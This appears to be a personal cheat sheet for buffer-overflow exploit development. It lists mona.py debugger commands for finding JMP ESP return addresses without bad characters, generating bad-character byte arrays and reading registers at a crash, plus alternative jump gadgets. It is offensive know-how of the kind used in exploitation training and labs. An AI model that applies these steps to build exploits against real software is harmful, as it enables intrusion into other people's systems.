=======================================
===== BOF tipz ========================
=======================================

Mona.py
	-!mona modules							#list all modules within the program (DLL's, EXE's etc)
	-!mona find -s "\xff\xe4" -m User32.dll				#check for JMP ESP command within User32.dll
	-!mona modules -cpb '\x00\x0a\x0d'				#list imported modules that do not contain any of your bad chars
	-!mona find -s '\xff\xe4' -cpb '\x00\x0a\x0d'			#find a JMP ESP instruction that does not contain any bad chars
	-!mona find -s '\xff\xe4' -m 'SLMCF.DLL' -cpb '\x00\x0a\x0d'	#find a JMP ESP instuction within a specific DLL that contains no bad chars
	-!mona findmsp							#list contents of EIP, ESP, EBP at crash time
	-!mona bytearray -cpb "\x00"					#generate a byte array to find bad chars (this one omits the null byte 0x00)
	-!mona config -set workingfolder c:logs%p			#set the current working directory. Mona will put output here. 
	-!mona help assemble						#print a description of the assemble command and how to use it

Alternatives to the typical JMP ESP:
	-PUSH ESP, RETN
	-CALL ESP
	-ADD EAX, 12    JMP EAX
